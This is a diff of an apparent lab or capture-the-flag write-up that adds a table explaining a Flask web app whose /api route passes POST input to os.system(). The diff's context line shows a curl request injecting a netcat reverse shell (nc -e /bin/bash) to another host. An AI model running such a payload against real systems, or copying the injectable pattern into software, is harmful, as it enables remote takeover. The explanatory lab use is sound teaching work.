@@ -77,6 +77,13 @@ curl -x POST -d "request=nc -e /bin/bash 10.10.5.10 9999" http://10.10.10.10:500
 
 | Function | Description | 
 | :---: | :---: | 
-| Seconds | 301 |
-| Seconds | 301 |
-| Seconds | 301 |
+| #!/usr/bin/python | Forcing the web app to use my built in python path |
+| import os | Importing the os library to use it's functionality such as calling os.system() |
+| Flask | Micro Web Framework Written to run the web application  |
+| @app.route | Specifies the internal web app route to the location on the web server where it receives input  |
+| /api | The actual route on the web server (Web API Route) |
+| POST | Enforces that the route accept only HTTP POST requests |
+| data | Variable that stores input the web app receives |
+| os.system() | Function that allows the execution of shell commands |
+| request | Parameter in the /api route that accepts input via HTTP POST requests |
+| print(data) | Print the input received via the web API route , wrapped around os.system() that allows code execution |
